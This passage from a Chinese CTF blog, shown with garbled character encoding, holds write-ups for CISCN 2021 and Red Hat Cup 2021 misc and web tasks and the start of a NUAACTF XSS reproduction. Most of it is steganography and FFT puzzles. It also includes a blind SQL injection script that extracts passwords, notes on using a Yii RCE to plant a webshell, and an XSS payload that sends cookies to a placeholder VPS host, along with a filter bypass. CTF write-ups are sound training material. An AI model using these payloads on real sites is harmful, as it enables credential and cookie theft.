èƒ½å¸®æˆ‘åˆ†æåˆ†æä»–ä»¬åœ¨äº¤æµä»€ä¹ˆå—ï¼Ÿæ³¨æ„ï¼šflagå½¢å¼ï¼šCISCN{XXXXX} ä½ ä»¬åˆåœ¨åŠ å¯†é€šä¿¡ï¼ï¼ï¼ ï¼ˆè¿™é¢˜å¤ç°çš„ï¼Œç„¶è€Œè¿‡å»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œå½“æ—¶æ‰¾çš„èµ„æ–™å¿˜è®°è®°å½•äº†ï¼Œç°åœ¨åˆæ‡’å¾—å†æ‰¾äº†ï¼Œå°±ä½›ç³»å†™ä¸€å†™8 ï¼ˆè¿˜æ˜¯å»æ‰¾äº†ä¸‹èµ„æ–™ å”‰ å¼€å±€ç»™äº†ä¸€å †æ ¼å¼ç±»ä¼¼çš„æ•°æ®ã€‚ æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯ SMS çŸ­ä¿¡é‡Œç”¨çš„ PDU ç¼–ç ã€‚ PDU ç¼–ç è§„åˆ™ è¿˜æ‰¾åˆ°äº† åœ¨çº¿ PDU æ ¼å¼ç¼–ç /è§£ç çš„ç½‘ç«™ https://tool.letmetellyou.xyz/pdu/ æˆ–è€… http://www.sendsms.cn/pdu/ åœ¨ pypi æ‰¾åˆ°äº†ä¸€ä¸ª python çš„ moduleï¼š smspdu æ‰‹åŠ¨è§£ç å‰å‡ æ¡ å‘ç°æ˜¯ hello,bob!what is the flag? the first part of the flag is the first 8 digits of your phone number é‚£å…¶ä»–éƒ¨åˆ†å‘¢ çœ‹çœ‹ä½ èƒ½ä»è¿™äº›æ•°æ®é‡Œå‘ç°ä»€ä¹ˆï¼Ÿw465 5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8 f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf ... flag çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯å·ç çš„å‰8ä½ï¼Œ+8615030442000ï¼Œé‚£å°±æ˜¯ 15030442ã€‚ ä¹‹åå°±ä¸€å † hex ç¼–ç ã€‚ å†™ä¸ªè„šæœ¬æå–å¹¶å¯¼å‡ºåˆ°æ–‡ä»¶ã€‚ from smspdu.codecs import GSM, UCS2 from smspdu.easy import easy_sms from binascii import unhexlify # x = easy_sms('04910180F6040D91685130402400F0000012405291443408A0E65A381723DFC6E21ACD4C868971B3724E76138BCDE2F28D6C0BC76431F24C66A3E56E349C99569B8DC330B3D86C2ED76C319B6C5C2BD7C6B4F2CC7CABDD70305A39172E8B63B7304E4CA3C56AB1D9F886ABE56263DA6C9CA3E56662B1AC66BB8D6D61DAAD56B6E5C6B55C2E261BE7CA3233EC86AB99CBB4D9CD160BD764B3B2397C1BDF68B75CD96C268BCD') # print(x) with open('data.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') l1 = l[4:] x = '' for i in l1: tmp = easy_sms(i)['content'] print(tmp) x += tmp print(x) # x.encode() y = unhexlify(x) with open('decode.dat', 'wb') as fout: fout.write(y) binwalk ä¸€ä¸‹å‘ç°æœ‰å¼  png å›¾ç‰‡ï¼Œæå–å‡ºæ¥ã€‚ ç„¶è€Œå‘ç°æ‰“ä¸å¼€â€¦â€¦ ç„¶åæ¯”èµ›çš„æ—¶å€™è¯•äº†ç”¨ PCRT æ¥ä¿®å¤ï¼Œä½†æ²¡æˆåŠŸã€‚ç½‘ä¸Šæ‰¾äº†ä¸ªå·¥å…·ç„¶åè¦æ”¶é’±ï¼Œæ°”æ­»å–µå–µäº†ï¼ï¼ï¼ åæ¥å‘ç°éœ€è¦æŒ‰ç…§æ—¶é—´é¡ºåºæ’åºã€‚ å”‰å¥½çƒ¦ï¼ˆ \"\"\" MiaoTony \"\"\" from smspdu.codecs import GSM, UCS2 from smspdu.easy import easy_sms from binascii import unhexlify with open('data.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') l1 = l[4:] x = [] ts = [] for i in l1: tmp = easy_sms(i) content = tmp['content'] t = tmp['date'] x.append(content) ts.append(t) l2 = sorted(zip(x, ts), key=lambda x: x[1]) l3 = list(zip(*l2))[0] info = ''.join(l3) # type(info) # str y = unhexlify(info) with open('decode2.dat', 'wb') as fout: fout.write(y) å¾—åˆ°ä¸€å¼ å›¾ï¼Œç»ˆäºèƒ½æ‰“å¼€äº†ï¼Œè€Œä¸”æ•´ä¸ªæ•°æ®å°±æ˜¯ä¸€æ•´å¼ å›¾ç‰‡ã€‚ç„¶è€Œè¿˜æ˜¯æ²¡æ€è·¯ã€‚ çœ‹äº†å¤§ä½¬ä»¬çš„ wp æ‰å‘ç°ï¼Œw465 æ˜¯å®½åº¦ä¸º 465 çš„æ„æ€â€¦â€¦è‰ï¼ æ”¹äº†ä¹‹åå¾—åˆ° äºæ˜¯ flag å°±æ˜¯ CISCN{15030442_b586_4c9e_b436_26def12293e4} ç¬¬ä¸‰é˜¶æ®µrobot é¢˜ç›®æè¿°ï¼šåˆ†æç»™å‡ºçš„æœºå™¨äººä»¿çœŸç¨‹åºå’Œæµé‡åŒ…ï¼Œæå–æœºå™¨äººæ§åˆ¶ç¨‹åºæ§åˆ¶æœºå™¨äººå†™å‡ºçš„å­—ç¬¦ä¸²ï¼Œflagä¸ºâ€CISCN{md5(æœºå™¨äººç»˜åˆ¶çš„å­—ç¬¦ä¸²)}â€ï¼ˆmd5å€¼å°å†™ï¼‰ Robot.rspag æ˜¯ RobotStudio æ–‡ä»¶ï¼Œcap.pcapng æ˜¯ç½‘ç»œæµé‡æŠ“åŒ…ï¼ŒControl ç›®å½•ä¸‹æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„åŸºäº C# å†™çš„ä¸€ä¸ªå›¾å½¢åŒ–ä¸Šä½æœºï¼Œä»¥åŠå¯¹åº”çš„ dll æ–‡ä»¶ã€‚ ç”¨ ILSPY åæ±‡ç¼– exeï¼Œå‘ç°å…¶å®éƒ½æ˜¯è°ƒç”¨åº•å±‚ dll æä¾›çš„ SDK æ¥å£ï¼Œå¹¶æ²¡æœ‰è‡ªå·±å»å®ç°ç½‘ç»œé€šä¿¡ç›¸å…³çš„åŠŸèƒ½ã€‚ å‚è€ƒç›¸å…³çš„èµ„æ–™ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ https://blog.csdn.net/weixin_39090239/article/details/81275759 https://blog.csdn.net/weixin_42837024/article/details/100542204 https://zhuanlan.zhihu.com/p/62390089?ivk_sa=1024320u https://developercenter.robotstudio.com/ ä¹‹ååœ¨æµé‡é‡Œå‘ç°æœ‰ä¸€ç³»åˆ—è®¾ç½®åæ ‡çš„ï¼Œç›²çŒœè¿™ä¸ªå°±æ˜¯æœºå™¨äººç”»çš„ä¸œè¥¿äº†ã€‚ äºæ˜¯å†™ä¸ªè„šæœ¬æå–ä¸€ä¸‹ï¼Œç”»å¼ å›¾ã€‚ \"\"\" MiaoTony \"\"\" import re import cv2 import os from PIL import Image import numpy as np im = Image.new('RGB', (400, 400)) width = im.width height = im.height with open('test.dat', 'r', encoding='utf-8') as fin: s = fin.read() re_pos = re.compile(r'tgPos{(\\d+)}\\.Value\\.(\\[\\d+,\\d+,\\d+\\])') l = re_pos.findall(s, re.M) with open('data.dat', 'w', encoding='utf-8') as fout: fout.write(str(l)) points = [eval(x[1])[:2] for x in l] # l = [[27, 36, 0], [28, 35, 0], [29, 35, 0], [31, 35, 0], [32, 35, 0], [33, 35, 0], [35, 35, 0], # [36, 35, 0], [37, 35, 0], [39, 34, 0]] for i in points: im.putpixel(i, (255, 255, 255)) im.show() im.save('info.png') # easy_robo_xx è¿˜åŸå‡ºæ¥æœºå™¨äººç»˜åˆ¶çš„å­—ç¬¦ä¸²ä¸º easy_robo_xx md5 d4f1fb80bc11ffd722861367747c0f10 CISCN{d4f1fb80bc11ffd722861367747c0f10} å°ç»“æ„Ÿè°¢ 360 é¦–æ¬¡å°† CTF é¶åœºå˜æˆäº†è€ƒåœºã€‚ åˆèµ›å°±è¿™ä¹ˆè‚ä¹Ÿå¤ªé¡¶äº†ï¼Œæ‰“ä¸åŠ¨äº† Orz åä¸œåŒ—èµ›åŒºä¹Ÿå¤ªå·äº†å§ï¼Œå–µå‘œå‘œå‘œã€‚ å”‰ï¼Œä¸è¿‡å’±æ²¡è¿›å¤èµ›ï¼Œå–µå‘œå‘œå‘œå‘œã€‚ å®³ï¼Œé—®é¢˜ä¸å¤§ï¼Œå¯èƒ½ä¹Ÿæ˜¯æœ€åä¸€æ¬¡å›½èµ›äº†å§ï¼Œéš¾å¾—å¤§å¸ˆå‚…ä»¬å¸¦å’±ç©ï¼Œä¹Ÿéå¸¸æ„Ÿè°¢é˜Ÿå‹ä¸€èµ·æ‰“ã€‚ ä¹‹åå¤§ä½¬ä»¬å¥½å¥½ç©ï¼Œå’±æºœäº†æºœäº†å–µã€‚","path":"2021/05/25/CTF_2021CISCN_preliminary/"},{"title":"CTF | 2021 çº¢å¸½æ¯ WriteUp","text":"å¼•è¨€ ç¬¬å››å±Šâ€œçº¢å¸½æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ› æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ9æ—¥10:00-18:00 https://race.ichunqiu.com/2021redhat å‰æ®µæ—¶é—´æ‰“äº†ä¸ªçº¢å¸½æ¯ï¼Œä¸è¿‡è¿™æ®µæ—¶é—´ä¸€ç›´åœ¨å¿™æ²¡ç©ºæ•´ç† Writeupã€‚ è¶ç€ä»Šå¤©æ‘¸é±¼ï¼Œå¤ç°äº†ä¸¤é“ Misc é¢˜ã€‚å…¶ä»–å°±ç®€å•è®°å½•ä¸€ä¸‹å§ã€‚ Miscç­¾åˆ°EBCDIC ç¼–ç  flag{we1c0me_t0_redhat2021} colorful code colorful code is beautiful, isnâ€™t it? æœ€ç»ˆå¾—åˆ°flagçš„æ ¼å¼ä¸­åŠ ä¸Šflag{}åŒ…è£¹å†æäº¤ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ä¸‹è½½ä¸‹æ¥ä¸¤ä¸ª data{1,2} data1 æ˜¯ä¸€ä¸² 0-19 ä¹‹é—´çš„æ•°å­— data2 æ˜¯ä¸€å †å¥‡å¥‡æ€ªæ€ªä½†åˆæœ‰è§„å¾‹çš„å­—ç¬¦ è€Œ data2 è¿™æœ€å‰é¢çš„ä¸œè¥¿å¥½åƒé¢œè‰²çš„æ ‡è¯†å•Šã€‚å°±ç±»ä¼¼äº #FF0000 è¿™æ ·ã€‚ äºæ˜¯å‘ç°å¯èƒ½æ˜¯ npietã€‚ å‚è€ƒ https://www.dangermouse.net/esoteric/piet.html Piet is a programming language in which programs look like abstract paintings. The language is named after Piet Mondrian, who pioneered the field of geometric abstract art. I would have liked to call the language Mondrian, but someone beat me to it with a rather mundane-looking scripting language. Oh well, we canâ€™t all be esoteric language writers I suppose. å‚è€ƒ https://www.bertnase.de/npiet/ npiet is an interpreter for piet programs and takes as input a portable pixmap (a ppm file) and since v0.3a png and gif files too - other formats may follow. è¿™æ˜¯ä¸€ç§åŸºäºå›¾åƒé¢œè‰²çš„ç¼–ç¨‹è¯­è¨€ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–æœ‰æ„æ€è€Œç¥ç§˜çš„ç¼–ç¨‹è¯­è¨€ï¼Œè¯¦è§ Esoteric programming languageã€‚ ç»Ÿè®¡ä¸€ä¸‹ data1 æ€»å…±æœ‰ 7076 ä¸ªæ•°å­—ï¼Œåˆ†è§£è´¨å› æ•° å¾—åˆ°ä¸º 37*191ã€‚ è€ƒè™‘è¿™å°±æ˜¯å›¾åƒçš„å®½å’Œé«˜äº†ã€‚ æŒ‰ç…§åŸç‰ˆçš„æ˜ å°„ï¼Œé¢œè‰²åº”è¯¥å¯¹åº”æ˜¯ä¸‹å›¾è¿™æ ·çš„ã€‚ ç„¶è€Œè¿™é¢˜é‡Œé­”æ”¹äº†ä¸€ä¸‹ï¼Œå°±æ ¹æ® data2 é‡æ–°æ˜ å°„ä¸€ä¸‹ã€‚ å†™ä¸ª jioæœ¬ã€‚ \"\"\" MiaoTony \"\"\" from PIL import Image with open('data1', 'r') as fin: s = fin.read() # print(s) l = s.split(' ')[:-1] # print(len(l)) # 7067 # åˆ†è§£è´¨å› æ•° http://tools.jb51.net/jisuanqi/factor_calc # 37*191 x = 37 y = 191 c = Image.new(\"RGB\", (x, y)) # åŸç‰ˆæ˜ å°„ # colors = [\"FFC0C0\", \"FFFFC0\", \"C0FFC0\", # \"C0FFFF\", \"C0C0FF\", \"FFC0FF\", # \"FF0000\", \"FFFF00\", \"00FF00\", # \"00FFFF\", \"0000FF\", \"FF00FF\", # \"C00000\", \"C0C000\", \"00C000\", # \"00C0C0\", \"0000C0\", \"C000C0\", # \"000000\", \"FFFFFF\"] # æŒ‰ç…§ data2 å‰20ä¸ªåƒç´ æ¥æ˜ å°„ colors = ['000000', '0000C0', '00FFFF', '00FF00', 'FFC0FF', 'FFC0C0', 'C0C0FF', 'C0C000', 'FF00FF', 'FF0000', 'C00000', 'C000C0', 'FFFFFF', 'FFFF00', 'FFFFC0', '00C000', '00C0C0', 'C0FFFF', 'C0FFC0', '0000FF'] def hex2int(h): return (int(h[:2], 16), int(h[2:4], 16), int(h[4:6], 16)) cnt = 0 for i in range(0, x): for j in range(0, y): color = colors[int(l[cnt])] c.putpixel([i, j], hex2int(color)) cnt += 1 c.show() c.save(\"c.png\") å¾—åˆ° å†åˆ° npiet online ä¸Šå»æ‰§è¡Œä¸€ä¸‹ï¼Œå°±èƒ½æ‹¿åˆ° flag äº†ã€‚ flag{88842f20-fb8c-45c9-ae8f-36135b6a0f11} PicPic ä½ æƒ³æˆä¸ºCVå¤§å¸ˆå˜›ï¼Ÿ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ challenge 1create.py import os import cv2 import struct import numpy as np def mapping(data, down=0, up=255, tp=np.uint8): data_max = data.max() data_min = data.min() interval = data_max - data_min new_interval = up - down new_data = (data - data_min) * new_interval / interval + down new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p if __name__ == '__main__': os.mkdir('m') os.mkdir('p') os.mkdir('frame') os.system('ffmpeg -i secret.mp4 frame/%03d.png') files = os.listdir('frame') r_file = open('r', 'wb') for file in files: img = cv2.imread(f'frame/{file}', cv2.IMREAD_GRAYSCALE) m, p = fft(img) r_file.write(struct.pack('!ff', m.min(), m.max())) new_img1 = mapping(m) new_img2 = mapping(p) cv2.imwrite(f'm/{file}', new_img1) cv2.imwrite(f'p/{file}', new_img2) r_file.close() os.system('ffmpeg -i m/%03d.png -r 25 -vcodec png 1.mkv') os.system('ffmpeg -i p/%03d.png -r 25 -vcodec png 2.mkv') å¯ä»¥å‘ç°æŠŠè§†é¢‘åˆ‡åˆ†å¾—åˆ°æ¯ä¸€å¸§ï¼Œç„¶å FFT å¾—åˆ°å¹…åº¦må’Œç›¸ä½pï¼Œå†åˆå¹¶å¾—åˆ°ä¸¤ä¸ªè§†é¢‘ã€‚æ–‡ä»¶ r é‡Œå­˜äº†æ¯ä¸€å¸§ä¸­å¹…å€¼çš„æœ€å¤§å’Œæœ€å°å€¼ã€‚ é‚£å’±å°±åè¿‡æ¥ï¼Œé€šè¿‡å¹…å€¼å’Œç›¸ä½çš„è§†é¢‘åˆ‡åˆ†å¾—åˆ°æ¯ä¸€å¸§ï¼Œç„¶å IFFT å˜æ¢å›å»å°±å®Œäº‹äº†ã€‚ ç›¸ä½èŒƒå›´å°±æ˜¯ -pi åˆ° pi ä¹‹é—´ã€‚ å†™ä¸ªè„šæœ¬ã€‚ \"\"\" MiaoTony \"\"\" import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def unmapping(data_min, data_max, data, down=0, up=255, tp=np.uint8): interval = data_max - data_min new_interval = up - down new_data = (data-down) * interval / new_interval + data_min # new_data = (data - data_min) * new_interval / interval + down # new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(m, p): x = np.exp(m)*np.exp(1j*p) y = np.fft.ifftshift(x) img = np.real(np.fft.ifft2(y)) img = img.astype(np.uint8) # print(img) return img if __name__ == '__main__': # os.mkdir('m') # os.mkdir('p') # os.mkdir('frame') # os.system('ffmpeg -i 1.mkv m/%03d.png') # os.system('ffmpeg -i 2.mkv p/%03d.png') r_file = open('r', 'rb') s = r_file.read() r_file.close() print(s) m_data = [] for i in range(len(s)//8): x = struct.unpack('!ff', s[i*8:(i+1)*8]) # print(x) # min, max m_data.append(x) files = os.listdir('m') for idx, file in enumerate(files): m_img = cv2.imread(f'm/{file}', cv2.IMREAD_GRAYSCALE) p_img = cv2.imread(f'p/{file}', cv2.IMREAD_GRAYSCALE) m_min, m_max = m_data[idx] m = unmapping(m_min, m_max, m_img) p = unmapping(-np.pi, np.pi, p_img) img_raw = ifft(m, p) # plot(img_raw) # show() cv2.imwrite(f'frame/{file}', img_raw) åœ¨è¿˜åŸåçš„è§†é¢‘çš„æœ€åï¼Œå¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç  zs6hmdlq5ohav5l1 challenge 2hint.txt æ˜¯ä¸ª MathML &lt;math&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;mo&gt;âŸ¶&lt;/mo&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;math&gt; ä¹Ÿå°±æ˜¯ æ„æ€æ˜¯å¹…å€¼ä¸å˜ï¼Œè€Œç›¸ä½ç›¸äº’äº¤æ¢ã€‚ å¦å¤–ç»™äº†ä¸¤å¼ å›¾ ç¬¬äºŒå¼ æ˜æ˜¾æœ‰ä¸ªäºŒç»´ç ï¼Œè„šæœ¬æ•´ä¸€ä¸ªï¼ \"\"\" MiaoTony \"\"\" import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(m, p): x = np.exp(m)*np.exp(1j*p) y = np.fft.ifftshift(x) img = np.real(np.fft.ifft2(y)) img = img.astype(np.uint8) # print(img) return img if __name__ == '__main__': img1 = cv2.imread(f'mix1.png', cv2.IMREAD_GRAYSCALE) img2 = cv2.imread(f'mix2.png', cv2.IMREAD_GRAYSCALE) m1, p1 = fft(img1) m2, p2 = fft(img2) new_img1 = ifft(m1, p2) new_img2 = ifft(m2, p1) cv2.imwrite('new1.png', new_img1) cv2.imwrite('new2.png', new_img2) å…¶ä¸­ä¸€å¼ é‡Œé¢å°±çœ‹å‡ºäºŒç»´ç äº†ã€‚ å†ç¨å¾®è°ƒä¸€ä¸‹å›¾åƒçš„æ›²çº¿ã€‚ æ‰«ç å¾—åˆ° 0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f å””ï¼ŒIFFT é‚£æ­¥åº”è¯¥å–æ¨¡å€¼è€Œä¸æ˜¯ç›´æ¥å–å®éƒ¨ï¼Œä¹Ÿå°±æ˜¯æ”¹æˆ img = np.abs(np.fft.ifft2(y)) è¿™æ ·å¾—åˆ°çš„å›¾ç‰‡å°±ä¸ä¼šä¸¢å¤±è™šéƒ¨çš„ä¿¡æ¯äº†ã€‚ final challenge æ ¹æ®æ–‡ä»¶åç§°ï¼Œç›²çŒœæ˜¯ç›¸ä½ä¸Šæœ‰çŒ«è…»ã€‚ é¦–å…ˆå°†å¹…å€¼è°ƒæ•´åˆ° -pi åˆ° pi ä¹‹é—´ï¼Œå½“ä½œç›¸ä½ï¼Œä½œå‚…é‡Œå¶åå˜æ¢ï¼Œæœ€åå†å½’ä¸€åŒ–åˆ° 0 åˆ° 255 ä¹‹é—´ï¼Œç”»å‡ºå›¾åƒã€‚ import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def mapping(data, down=0, up=255, tp=np.uint8): data_max = data.max() data_min = data.min() interval = data_max - data_min new_interval = up - down new_data = (data - data_min) * new_interval / interval + down new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(p): x = np.exp(1j*p) y = np.fft.ifftshift(x) img = np.abs(np.fft.ifft2(y)) return img if __name__ == '__main__': img = cv2.imread(f'phase.png', cv2.IMREAD_GRAYSCALE) # print(img.max(), img.min()) p = mapping(img, -np.pi, np.pi, tp=np.float64) img_raw = ifft(p) img2 = mapping(img_raw) cv2.imwrite('final.png', img2) å¾—åˆ° AESKEY: a8bms0v4qer3wgd67ofjhyxku5pi1czl è€Œåç”¨ AES ECB æ¨¡å¼è§£å¯† from Crypto.Cipher import AES key = \"a8bms0v4qer3wgd67ofjhyxku5pi1czl\" aes = AES.new(key, AES.MODE_ECB) cipher = binascii.unhexlify( \"0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f\") flag = aes.decrypt(cipher) print(flag) # b'flag{1ba48c8b-4eca-46aa-8216-d164538af310}\\x06\\x06\\x06\\x06\\x06\\x06' flag{1ba48c8b-4eca-46aa-8216-d164538af310} è‰ï¼Œæœç„¶æ˜¯ CV å¸¦å¸ˆï¼ŒæŠŠå‚…é‡Œå¶å˜æ¢å„ç§æŠ˜è…¾ï¼Œå–µå–µæ˜¯ fwï¼Œå’±è‡ªå·±çˆ¬ï¼ˆï¼ˆ Webfind_itrobots.txt æ³„éœ²ï¼Œè®¿é—® 1ndexx.php æŠ¥500ï¼Œåæ‰“å¼€ .1ndexx.php.swp æ‹¿åˆ°æºç ï¼Œphpinfo é¡µé¢æ‹¿åˆ° flag code=&lt;?php phpinfo();?&gt; frameworkwww.zip æ‹¿åˆ°æºç  yii ååºåˆ—åŒ–æ¼æ´ RCE CVE-2020-15148 https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP é­”æ”¹ exp file_put_contents ä¸Šä¼ é©¬ï¼Œç„¶åèšå‰‘è¿ä¸Šåç»•è¿‡ disable_functionï¼Œæ‹¿åˆ° flag WebsiteMangerimage.php?id= å­˜åœ¨æ³¨å…¥ import requests passwd = '' for i in range(1, 100): for j in range(48, 103): url = 'http://eci-2zeir5o8p6vh97bek411.cloudeci1.ichunqiu.com/image.php?id=if(ascii(substr((select/**/group_concat(password)/**/from/**/users),{},1))={},1,0)'.format( i, j) r = requests.get(url) if(r.content): print(chr(j)) passwd += chr(j) print(passwd) continue # e845b14ae11ff886a2f72 admin / e845b14ae11ff886a2f72 ç™»å½• è€Œå SSRF file:///flag æ‹¿åˆ° flag å°ç»“å–µå–µå¥½èœå•Šï¼Œå–µå‘œå‘œã€‚ å†™è®ºæ–‡å¥½çƒ¦å•Šï¼Œå¤ªéš¾å—å•¦ï¼ è¿˜æ˜¯æ‘¸é±¼èˆ’æœã€‚ ï¼ˆæºœäº†æºœäº†","path":"2021/05/24/CTF_2021RedHat/"},{"title":"CTF | 2021 NUAACTF Easy_XSS å¤ç°","text":"æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/9516 å¼•è¨€åœ¨ NUAACTF 2021 ä¸­ï¼Œæœ‰ä¸€é“ XSS ç›¸å…³çš„é¢˜ç›® Easy_XSSï¼Œæ¯”èµ›çš„æ—¶å€™å°±åªæœ‰ä¸€é˜Ÿåšå‡ºæ¥äº†ã€‚ ï¼ˆå½“ç„¶åªæ˜¯æ ¡å†…ç©ç©è€Œå·²ï¼Œå¤§å¸ˆå‚…ä»¬åº”è¯¥éšä¾¿å°± AK äº† Orz é¢˜ç›®è€ƒç‚¹ä¸»è¦æ¶‰åŠ XSS ç»•è¿‡ã€PHP ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ç­‰ï¼Œéš¾åº¦å…¶å®è¿˜å¥½ã€‚ æœ€è¿‘å‡ å¤©æ‘¸é±¼ï¼Œå°±æ¥å¤ç°ä¸€ä¸‹å§ã€‚ é¡ºä¾¿è¿˜æ‹“å±•å­¦ä¹ äº†ä¸€ä¸‹ iframe æ ‡ç­¾ä¸­çš„ srcdoc å±æ€§åœ¨ XSS ä¸­çš„åˆ©ç”¨ã€‚ é¢˜ç›®æè¿° Easy XSS å°è¯•å»è·å–ç®¡ç†å‘˜çš„ç¥ç§˜é¡µé¢ upload.php å§ï¼ http://45.76.221.54:8005 è§£é¢˜æ­¥éª¤Step 01 æ”¶é›†ç¯å¢ƒä¿¡æ¯æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸ª Blogï¼Œå¯ä»¥åœ¨é‡Œé¢å‘ postã€‚ å‘ post éœ€è¦ç™»å½•ï¼Œé‚£å°±å…ˆéšæ„æ³¨å†Œä¸ªè´¦æˆ·ã€‚ æ ¹æ®é¢˜ç›®æè¿°ï¼Œç›´æ¥è®¿é—® upload.phpï¼Œä¼šæç¤ºéœ€è¦ admin æ‰èƒ½ä¸Šä¼ ã€‚ å•Šï¼Œå±…ç„¶æ²¡æœ‰å‰ç«¯ç•Œé¢ï¼Œåªæœ‰ä¸‘ä¸‘çš„æºä»£ç  å¯æ˜¯æœ‰æºä»£ç å¼å•Šï¼ é‚£å°±çœ‹çœ‹æ€ä¹ˆè·å– admin æƒé™å¥½äº†ã€‚ Step 02 XSS åŠå…¶ç»•è¿‡æ—¢ç„¶æ˜¯ XSS å˜›ï¼Œé‚£å°±æƒ³åˆ°å…ˆè¯•è¯• img æ ‡ç­¾å¥½äº†ã€‚ å…ˆæ„é€ ä¸€ä¸ªæœ€æ™®é€šçš„ï¼Œåˆ©ç”¨ url æ¥ä¼ é€’ cookieã€‚ è‡ªå·±çš„ VPS ä¸Šèµ·ä¸ª web æœåŠ¡æ¥æ¥æ”¶ä¸€ä¸‹ï¼Œæˆ–è€…å¦‚æœæœ‰ NGINX çš„è¯çœ‹çœ‹ log ä¹Ÿè¡Œã€‚ payload: meow &lt;img src='#' onerror=\"window.location.href='//VPSIP:PORT/'+document.cookie\"&gt; 233 ç„¶è€Œå‘ç° img window document on è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œlocation -&gt; locatiã€‚ é‚£å°±è¯•è¯•åŒå†™ç»•è¿‡è¡Œä¸è¡Œã€‚ meow &lt;imimgg src='#' oonnerror=\"windwindowow.locatioonn.href='//VPSIP:PORT/'+documdocumentent.cookie\"&gt; 23333 å¾ˆå¥½ï¼ŒæˆåŠŸæ„é€ å‡ºäº†é¢„æœŸçš„ xss è¯­å¥ï¼Œå®ç°äº†è·³è½¬ã€‚ æ¥ä¸‹æ¥å°±å‹¾ä¸Š Publish this postï¼Œè®© admin 